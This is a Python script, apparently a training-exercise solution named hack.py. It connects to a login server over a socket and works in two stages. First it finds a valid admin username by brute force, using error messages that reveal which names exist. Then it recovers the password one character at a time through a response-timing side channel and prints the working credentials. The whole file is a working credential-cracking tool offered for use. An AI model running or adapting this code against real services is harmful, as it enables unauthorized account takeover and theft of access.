import socket
import argparse
import itertools
import json
import time
from string import ascii_letters, digits


CHARACTERS = ascii_letters + digits


def find_admin_login(client_socket):
    logins = load_logins()

    for login in logins:
        data = {
            "login": login,
            "password": "123456"
        }

        client_socket.send(json.dumps(data).encode())
        response = client_socket.recv(10240)
        response = response.decode()
        response_dict = json.loads(response)
        if response_dict["result"] == "Wrong password!":
            return login
    return None

def find_password(client_socket, login, current_pass = ""):
    password_iter = itertools.product(CHARACTERS)
    pass_map = {}
    for pwd_tuple in password_iter:
        password = current_pass + "".join(pwd_tuple)
        data = {
            "login": login,
            "password": password
        }
        start = time.perf_counter()
        client_socket.send(json.dumps(data).encode())
        response = client_socket.recv(10240)
        end = time.perf_counter()
        total_time = end - start
        pass_map[password] = total_time
        response = response.decode()
        response_dict = json.loads(response)

        if response_dict["result"] == "Connection success!":
            login_form = {"login": login, "password": password}
            print(json.dumps(login_form))
            client_socket.close()
            return True

    # find longest response (excepton handling on server-side)
    longest = max(pass_map.items(), key=lambda item: item[1])
    current_pass = longest[0]
    if find_password(client_socket, login, current_pass):
        return True
    return False

def hack(client_socket):
    login = find_admin_login(client_socket)
    if login:
        find_password(client_socket, login)

def connection(hostname, port):
    with socket.socket() as client_socket:
        address = (hostname, port)

        client_socket.connect(address)
        hack(client_socket)

def load_logins():
    with open("logins.txt", "r") as file:
        passwords = [line.strip() for line in file]
    return passwords

# python hack.py localhost 9090
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "hostname",
        type=str
    )
    parser.add_argument(
        "port",
        type=int
    )

    args = parser.parse_args()
    connection(args.hostname, args.port)


if __name__ == "__main__":
    main()
